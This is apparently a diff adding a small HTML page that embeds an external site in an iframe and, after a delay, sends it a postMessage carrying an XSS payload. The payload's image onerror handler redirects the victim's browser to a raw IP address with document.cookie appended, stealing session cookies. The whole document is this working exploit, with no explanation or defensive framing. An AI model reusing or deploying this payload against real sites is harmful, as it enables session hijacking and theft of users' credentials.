@@ -1,0 +1,6 @@
+hello
+<iframe id="kkk" src="http://umsg.iffi.top:3000/" style="width:1500px;height:1500px;"></iframe>
+<script>
+let myframe = document.getElementById('kkk');
+setTimeout(function(){myframe.contentWindow.postMessage({action:"append",payload:"<img src='x' onerror=window.location='http://120.79.24.186:9999?c='+document.cookie></img>"},"*")},3000);
+</script>
